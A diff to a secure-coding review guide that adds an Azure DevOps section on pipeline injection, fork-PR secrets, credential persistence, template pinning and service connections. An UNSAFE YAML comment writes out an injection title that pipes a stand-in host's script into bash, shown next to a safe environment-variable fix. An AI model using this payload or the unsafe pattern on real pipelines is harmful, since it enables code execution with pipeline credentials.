@@ -19,7 +19,8 @@ workflow definitions. This file covers those surfaces concretely.
 - [A03 — Dependency Manifests and Lockfiles](#a03--dependency-manifests-and-lockfiles)
 - [A03 — Dependency Confusion and Typosquatting](#a03--dependency-confusion-and-typosquatting)
 - [A03 — Install Scripts](#a03--install-scripts)
-- [A03 — CI/CD Pipelines](#a03--cicd-pipelines)
+- [A03 — CI/CD: GitHub Actions](#a03--cicd-github-actions)
+- [A03 — CI/CD: Azure DevOps](#a03--cicd-azure-devops)
 - [A03 — Provenance, Signing, and SBOM](#a03--provenance-signing-and-sbom)
 
 ---
@@ -38,7 +39,7 @@ and frequently unreviewed:
 | Web server | `nginx.conf`, `httpd.conf`, ingress annotations |
 | Dependencies | `package.json` + lockfile, `requirements.txt`, `pyproject.toml`, `go.mod`, `pom.xml`, `Gemfile`, `Cargo.toml` |
 | Registry config | `.npmrc`, `pip.conf`, `settings.xml`, `.yarnrc.yml` |
-| Pipelines | `.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`, `azure-pipelines.yml` |
+| Pipelines | `azure-pipelines*.yml`, `.azuredevops/**`, `.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile` |
 
 Two questions cut through most of it: **what runs as root or with wildcard permissions**, and
 **what executes code that someone outside the repo controls**.
@@ -278,7 +279,7 @@ in a container without credentials or network access beyond the registry.
 
 ---
 
-## A03 — CI/CD Pipelines
+## A03 — CI/CD: GitHub Actions
 
 The pipeline has repository write access and production credentials. It is a higher-value target
 than the application.
@@ -320,6 +321,87 @@ jobs:
 - Secrets echoed, passed to untrusted steps, or exposed to fork-triggered runs
 - Self-hosted runners on public repositories — fork PRs get code execution on your infrastructure
 - No required review or branch protection on the branch that deploys
+
+---
+
+## A03 — CI/CD: Azure DevOps
+
+Same threat model as Actions, different syntax — and the syntax is where the bug usually is.
+Three expression forms exist, and only one of them is a textual substitution into your script:
+
+| Form | When it resolves | Risk |
+|---|---|---|
+| `${{ variable }}` | Compile time, before the job is generated | Template expansion; injection possible if it lands in a script |
+| `$(variable)` | Runtime, **pasted into the script text** before the shell parses it | **This is the injection vector** |
+| `$[ expression ]` | Runtime, evaluated by the agent, not pasted into scripts | Safer for values |
+
+```yaml
+# UNSAFE — the PR title is substituted into the shell command before it runs.
+# A title of  "; curl evil.sh | bash; #  executes on the agent, with pipeline credentials.
+steps:
+  - script: echo "Building $(System.PullRequest.SourceBranch) - $(Build.SourceVersionMessage)"
+```
+
+```yaml
+# SAFE — pass through env; the shell receives a variable, never a substituted string
+steps:
+  - script: echo "Building $BRANCH - $MSG"
+    env:
+      BRANCH: $(System.PullRequest.SourceBranch)
+      MSG: $(Build.SourceVersionMessage)
+```
+
+On PowerShell tasks the same rule applies: read `$env:MSG`, never interpolate `$(...)` into the
+inline script body.
+
+**Check for:**
+- **Fork PR builds with secrets.** In project settings, *"Make secrets available to builds of
+  pull requests from forked repositories"* must stay **off** for public projects, and
+  *"Require a team member's comment before building a pull request"* on. Enabling the first one
+  hands your secrets to anyone who can open a PR.
+- **Self-hosted agents building fork PRs** — the agent is your infrastructure, and the build runs
+  attacker-supplied code on it. Use Microsoft-hosted agents for untrusted PRs.
+- **`persistCredentials: true`** on `checkout` — leaves the pipeline token in `.git/config`, where
+  every later script step (including anything a dependency's install hook runs) can read it.
+  ```yaml
+  steps:
+    - checkout: self
+      persistCredentials: false     # unless a later step genuinely needs to push
+      clean: true
+  ```
+- **Queue-time settable variables.** A variable defined in the YAML is not settable at queue time,
+  but one defined in the pipeline UI with "Let users override this value" is — and it can be set
+  to something that changes what the pipeline executes. Declare variables in YAML and mark the
+  ones that must not move:
+  ```yaml
+  variables:
+    - name: deployTarget
+      value: staging
+      readonly: true
+  ```
+- **Unpinned external templates.** `resources.repositories` defaulting to a branch means the
+  template can change after review — pin a ref or a commit:
+  ```yaml
+  resources:
+    repositories:
+      - repository: templates
+        type: git
+        name: Platform/pipeline-templates
+        ref: refs/tags/v1.4.2        # not refs/heads/main
+  ```
+- **Marketplace extensions** installed org-wide without vetting; they run as tasks with pipeline
+  access. Prefer first-party tasks; pin task major versions (`Bash@3`) and review updates.
+- **Service connections** granted "Grant access permission to all pipelines" — scope each
+  connection to the pipelines that need it, and prefer **workload identity federation** over a
+  service principal secret that lives for a year.
+- **Secrets handling** — variable groups linked to Azure Key Vault rather than plaintext pipeline
+  variables; secret variables are not auto-mapped into `env`, so if you see one referenced as
+  `$(mySecret)` inside a script it is being pasted in as text. Watch for `System.AccessToken`
+  handed to steps that don't need it.
+- **Approvals and checks on Environments** for anything deploying to production, plus branch
+  policies (required reviewers, build validation) on the branch the release pipeline consumes —
+  without them, pipeline review is advisory.
+- `dotnet restore` / `npm install` in the build not using locked mode (see the lockfile table).
 
 ---
 
